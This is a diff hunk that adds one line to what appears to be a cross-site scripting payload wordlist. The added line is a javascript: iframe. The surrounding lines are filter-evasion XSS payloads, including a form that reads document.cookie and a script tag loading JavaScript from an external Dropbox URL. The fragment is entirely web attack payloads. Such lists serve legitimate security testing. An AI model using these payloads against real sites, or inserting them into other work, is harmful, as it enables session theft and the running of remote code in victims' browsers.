@@ -1365,6 +1365,7 @@ http://www.google<script .com>alert(document.location)</script
 <div/style="width:expression(confirm(1))">X</div> {IE7}
 <iframe// src=javaSCRIPT&colon;alert(1)
 <iframe// src="javaSCRIPT&colon;alert(1)">
+<iframe src="javascript:alert(1)">
 //<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
 /*iframe/src*/<iframe/src="<iframe/src=@"/onload=prompt(1) /*iframe/src*/>
 //|\\ <script //|\\ src='https://dl.dropbox.com/u/13018058/js.js'> //|\\ </script //|\\
